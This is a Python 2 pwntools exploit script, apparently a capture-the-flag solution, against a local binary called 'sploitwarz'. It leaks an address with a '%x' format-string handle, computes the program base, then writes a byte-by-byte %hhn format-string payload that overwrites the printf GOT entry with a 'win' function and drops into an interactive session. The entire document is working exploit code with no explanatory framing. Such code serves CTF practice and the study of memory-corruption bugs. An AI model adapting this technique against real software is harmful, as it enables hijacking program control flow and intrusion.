#!/usr/bin/env python2

from pwn import *

def eval_result(gamble_result):
    if (gamble_result == "Wrong"):
        return False
    else:
        return True


def gamble_input(p):
    p.recvuntil("What will you do? ", drop=True)
    p.sendline("g")
    p.recvuntil(": ", drop=True)
    p.sendline("0.00001")
    p.recvuntil("> ", drop=True)
    p.sendline("5")


def change_handle_input(p, new_handle):
    p.recvuntil("What will you do? ", drop=True)
    p.sendline("c")
    p.recvuntil("What is your new handle? ", drop=True)
    p.sendline("{}".format(new_handle))


def win_gamble(p):
    won = False
    while(not won):
        gamble_input(p)

        #get rid of new line before getting gamble result
        p.recvline()

        gamble_result = p.recvuntil("!", drop=True)
        won = eval_result(gamble_result)
        p.sendline()

    return gamble_result        


def get_addr(p):
    win_string = win_gamble(p)
    addr = win_string.split()[-1]
    return int(addr, 16)


# leaked addr is 540 bytes from start of .got
# start of first section is 0x3518 bytes from .got
def calc_elf(addr):
    return addr - 540 - 0x3518


p = process('./sploitwarz')
elf = p.elf

# set initial handle
p.recvuntil("> ", drop=True)
p.sendline("%x")

addr = get_addr(p)
elf.address = calc_elf(addr)

target_addr = elf.got['printf']
win_addr = elf.symbols['win']
win_addr0 = win_addr & 0xFF
win_addr1 = (win_addr & 0xFFFF) >> 8
win_addr2 = (win_addr & 0xFFFFFF) >> 16
win_addr3 = win_addr >> 24

payload = "{}{}{}{}".format(p32(target_addr), p32(target_addr + 1), 
        p32(target_addr + 2), p32(target_addr + 3))

payload += "%{}x%5$hhn".format(0x100 + win_addr0 - 16)
payload += "%{}x%6$hhn".format(0x100 + win_addr1 - win_addr0) 
payload += "%{}x%7$hhn".format(0x100 + win_addr2 - win_addr1)
payload += "%{}x%8$hhn".format(0x100 + win_addr3 - win_addr2)

change_handle_input(p, payload)
win_gamble(p)
p.interactive()

